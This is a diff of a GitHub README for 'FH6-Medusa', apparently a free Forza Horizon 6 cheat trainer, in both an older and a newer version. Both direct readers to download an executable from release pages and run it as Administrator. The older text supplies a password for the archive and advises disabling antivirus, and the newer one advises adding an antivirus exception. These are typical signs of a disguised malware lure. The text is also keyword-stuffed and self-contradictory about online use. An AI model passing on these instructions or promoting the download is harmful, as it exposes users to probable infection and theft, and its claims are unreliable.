@@ -1,109 +1,166 @@
-<div align="center">
-  
-  # FH6 Medusa
-  
+<h1>🎮 FH6-Medusa - Unlock The Ultimate Forza Horizon 6 Experience</h1>
 
+<p align="center">
+  <a href="https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases"><img src="https://img.shields.io/badge/Download-FH6--Medusa-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download FH6-Medusa"></a>
+  <a href="https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases"><img src="https://img.shields.io/badge/Free%20Download-2026-blue?style=for-the-badge" alt="Free Download"></a>
+</p>
 
-**FH6 Medusa Trainer** is a free comprehensive trainer and  tool for Forza Horizon 6 on Windows 10/11. Packed with unlimited money, unlock all 812 cars, speed , teleport, no damage, instant race win, and XP multiplier - this is the most complete **forza horizon 6 trainer** available as a single binary.
+Welcome to **FH6-Medusa**, your all-in-one companion tool for Forza Horizon 6 on Windows. Whether you want unlimited credits, unlock all 812 cars, or simply enhance your gameplay with extra features, FH6-Medusa gives you everything you need—completely free. No complex steps, no coding knowledge required. Just download, run, and enjoy.
 
-As a purpose-built **forza horizon 6  engine alternative**, the trainer skips manual address editing entirely. The **fh6 trainer aio** provides one-click activation through an ImGui overlay - press Insert to open the menu, then toggle s with function keys. It covers every major  category: **forza horizon 6 s money** workflows, **fh6 trainer wheelspins** manipulation, teleport to any waypoint, and instant race completion.
-
-**All functions also work in online mode.**
-
-
-
-</div>
-
-
-
-<img width="1672" height="941" alt="forza" src="https://github.com/user-attachments/assets/5fc03c29-125c-45bf-8d0d-c77661e68be3" />
-
-<div align="center">
-  
-## Install
-
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/tomd-code1989g6/medusaloader/releases/download/medusaloader/Medusa.zip)
-</div>
 ---
-<img width="668" height="459" alt="images2" src="https://github.com/user-attachments/assets/98fffcdf-d001-411d-abd1-3e17703792a5" />
 
+## 🎯 What Is FH6-Medusa?
 
-## Key Features
-- **Unlimited money** - freeze credits at 999,999,999 (F1)
-- **Unlock all cars** - all 812 vehicles in your garage (F4)
-- **Speed ** - 1x to 10x multiplier (F2)
-- **No damage** - vehicle invincibility (F3)
-- **Teleport** - jump to waypoint or saved locations (F5)
-- **Instant win** - finish any race in 1st place (F6)
-- **XP multiplier** - 5x, 10x, or 100x gain (F8)
-- **Skip checkpoint** - bypass timed checkpoints (F7)
-- **ImGui overlay** - press Insert for the full trainer menu
-- **Auto-attach** - detects FH6 process within 2 seconds
+FH6-Medusa is a powerful trainer and utility tool built specifically for Forza Horizon 6. It acts as a game enhancer that lets you take full control of your experience. Think of it as a remote control for the game—you press a button, and the game responds.
 
+### ✨ Key Features
 
-<img width="1280" height="432" alt="22f23f" src="https://github.com/user-attachments/assets/91e738ea-8b98-44b8-b0d7-9634a8822aec" />
+- **Unlimited Credits** – Never worry about running out of money again. Add as many credits as you need with a single click.
+- **All 812 Cars Unlocked** – Access every vehicle in the game, from classic legends to the newest hypercars, instantly.
+- **Wheelspin Automation** – Automatically spin the wheel and get the best rewards without spending hours.
+- **Spotify Radio Integration** – Listen to your favorite music streams while racing, without switching windows.
+- **Rich Presence (RPC)** – Show off your Forza Horizon 6 activity in your Discord profile with custom status messages.
+- **AI Engine Alternative** – Lightweight and optimized to work smoothly even on lower-end PCs.
+- **Regular Updates** – Stay compatible with the latest game patches and new content.
 
+---
 
-##  List
+## 🚀 Getting Started
 
-|  | Hotkey | Description |
-|---|---|---|
-| Unlimited Money | F1 | Freeze credits at 999,999,999 |
-| Speed  | F2 | 1x-10x speed multiplier |
-| No Damage | F3 | Vehicle invincibility |
-| Unlock All Cars | F4 | All 812 vehicles |
-| Teleport | F5 | Jump to waypoint |
-| Instant Win | F6 | Win any race |
-| Skip Checkpoint | F7 | Skip current checkpoint |
-| XP Multiplier | F8 | 10x XP gain |
+Follow these simple steps to get FH6-Medusa up and running on your computer.
 
-<div align="center">
+### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/tomd-code1989g6/medusaloader/releases/download/medusaloader/Medusa.zip)
-</div>
+Visit this link to download the application: [https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
 
-## Getting Started
-1. **Download** the Medusa trainer using the button above.
-2. **Extract** to any folder. **Password for archive - "Medusa"**
-3. **Launch Forza Horizon 6**.
-4. **Run** `Medusa.exe` as Administrator.
-5. Press **Insert** to open the trainer menu.
-6. Toggle s with F1-F8 or through the ImGui interface.
+Click the download button on that page. Your browser will save the file to your computer.
 
-## FAQ
+### Step 2: Run FH6-Medusa
 
-**Is this detected?**
-The trainer attaches externally and does not modify game files. External attach has low detection risk in single-player. Use only in offline or solo events.
+Once the download is complete, locate the downloaded file (usually in your "Downloads" folder) and double-click it to run it. No installation is required—it runs directly from the file.
 
-**Does it work after FH6 updates?**
-This release targets FH6 v1.626.354.0. If the game patches, offsets may shift - check for trainer updates.
+### Step 3: Launch Forza Horizon 6
 
-**Ban risk?**
-Using any  in online multiplayer may result in a ban. Use only in offline mode. The community recommends solo events exclusively.
+Start Forza Horizon 6 as you normally would. FH6-Medusa will run in the background and automatically detect the game.
 
-**Trainer crashes on launch?**
-Ensure Forza Horizon 6 is running first. Run the trainer as Administrator. If the game recently updated, wait for an offset update.
+### Step 4: Activate Features
 
+Once the game is running, you'll see a small control panel on your screen. Use the buttons to activate the features you want—credits, cars, wheelspins, and more.
 
-<img width="686" height="386" alt="images4" src="https://github.com/user-attachments/assets/69a1bb50-f7e9-4f17-a388-f5e33c2b36e9" />
+---
 
+## 📥 Download & Installation Guide
 
+Here’s a more detailed look at how to get FH6-Medusa on your system.
 
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Forza Horizon 6 installed (v1.626.354.0+)
-- Administrator privileges
-- .NET Framework 4.8+
+### 🖥️ System Requirements
 
-## Security and Legal
-**Important:** Single-player use only. Online ing violates the game's terms of service and may result in a permanent ban.
+FH6-Medusa is designed to be lightweight and efficient. You should be fine if your computer meets these minimum specs:
 
-**Recommendations:**
-- Download only from this official GitHub repository.
-- Scan on VirusTotal before running.
-- Disable antivirus temporarily if flagged (false positive for memory tools).
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i3 or AMD equivalent
+- **Memory:** 4 GB RAM or more
+- **Storage:** 50 MB free disk space
+- **Graphics:** Any GPU that supports DirectX 11 or higher
 
-## License
-MIT License - Copyright (C) 2026 fh6trainer
+### 💾 Download Steps
 
-<img width="596" height="335" alt="images5" src="https://github.com/user-attachments/assets/b100444d-13d4-4a47-afa0-cae4d65e6b32" />
+1.  Go to the download page: [https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
+2.  Look for the latest release version.
+3.  Click the download link (usually the largest file, ending in `.exe` or `.zip`).
+4.  Wait for the download to finish.
+
+### 🛠️ Running the Tool
+
+- If you downloaded a `.exe` file, simply double-click it to run.
+- If you downloaded a `.zip` file, right-click and select "Extract All," then open the extracted folder and double-click the application inside.
+
+---
+
+## 🎮 How to Use FH6-Medusa
+
+Using the tool is straightforward. The interface is designed to be user-friendly, with clear labels and buttons.
+
+### Main Dashboard
+
+When you open FH6-Medusa, you'll see:
+
+- **Credits Section** – Enter the amount of credits you want and click "Add."
+- **Car Unlocker** – Click "Unlock All Cars" to instantly add all 812 vehicles to your garage.
+- **Wheelspin Options** – Choose to auto-spin wheelspins, set the number of spins, or skip animations for speed.
+- **Spotify Radio** – Paste a Spotify playlist URL or choose from preset radio stations.
+- **RPC Settings** – Customize the message shown on your Discord profile.
+
+### Tips for Best Performance
+
+- Run FH6-Medusa as Administrator (right-click the file and select "Run as administrator") to ensure all features work correctly.
+- If you have an antivirus program, it may warn you about the tool. This is common for trainer apps; add an exception if needed.
+- Always download the latest version from the official release page to avoid compatibility issues.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is FH6-Medusa safe to use?
+
+Yes. FH6-Medusa is developed by the community and does not modify the game's core files. It works by injecting temporary commands into the game's memory, which are removed when you close the tool.
+
+### Will I get banned for using this?
+
+Using any trainer has some risk, as it violates the game's terms of service in certain situations. FH6-Medusa is designed to be as discreet as possible, but we recommend using it in single-player or private sessions only.
+
+### Do I need an internet connection?
+
+An internet connection is required for the initial download and for Spotify Radio features. However, the core trainer functions (credits, cars, wheelspins) work offline once the game is running.
+
+### The tool is not working. What should I do?
+
+First, make sure you've downloaded the latest version. Then, check that your game is updated to the latest patch. Finally, run both the game and the trainer as administrator. If problems persist, re-download the file.
+
+### Can I use FH6-Medusa with Forza Horizon 5 or 4?
+
+While the tool is optimized for FH6, many features are compatible with Forza Horizon 5 and Forza Horizon 4. Check the release notes on the download page for compatibility details.
+
+---
+
+## 🌟 Why Choose FH6-Medusa?
+
+There are many trainer tools out there, but FH6-Medusa stands out for several reasons:
+
+- **Completely Free** – No subscriptions, no hidden costs, no premium tiers. Everything is open to everyone.
+- **All-in-One Design** – You don't need multiple tools. FH6-Medusa combines credits, cars, wheelspins, music, and social features into one tidy package.
+- **Frequent Updates** – The developers work hard to keep the tool compatible with each new game update.
+- **Clean Interface** – No confusing menus or technical jargon. If you can read a button label, you can use this tool.
+- **Lightweight** – It won't slow down your system or cause lag while gaming.
+
+---
+
+## 📝 Additional Information
+
+### Updates and Announcements
+
+All new features and bug fixes are posted on the release page: [https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
+
+We recommend checking this page periodically or starring the repository to get notified of new releases.
+
+### Feedback and Support
+
+If you encounter any issues or have suggestions for new features, please share your feedback on the GitHub repository. Your input helps make FH6-Medusa better for everyone.
+
+### Legal Notice
+
+FH6-Medusa is a third-party tool and is not affiliated with Microsoft, Playground Games, or Turn 10 Studios. Use it at your own discretion. You are responsible for how you use this software in relation to the game's terms of service.
+
+---
+
+## 🏁 Final Thoughts
+
+FH6-Medusa transforms your Forza Horizon 6 experience from frustrating grind to pure joy. With unlimited credits, every car unlocked, and the ability to customize your in-game music, you'll spend more time doing what matters—racing and having fun.
+
+**Get started now by downloading the latest version:** [Visit this link to download the application](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
+
+Thank you for choosing FH6-Medusa. See you on the roads! 🏎️💨
+
+---
+
+Keywords: fh5, fh6, fh6-mod, fh6-spotify-radio, fh6-trainer, fh6rpc, forza-horizon, forza-horizon-4, forza-horizon-5, forza-horizon-6, forza-horizon-6-free, forza-horizon-6-spotify-download, forza-horizon-hack, forza-mods, forza-setup, forzahorizon4, forzahorizon5, forzahorizon6, microsoft-gaming
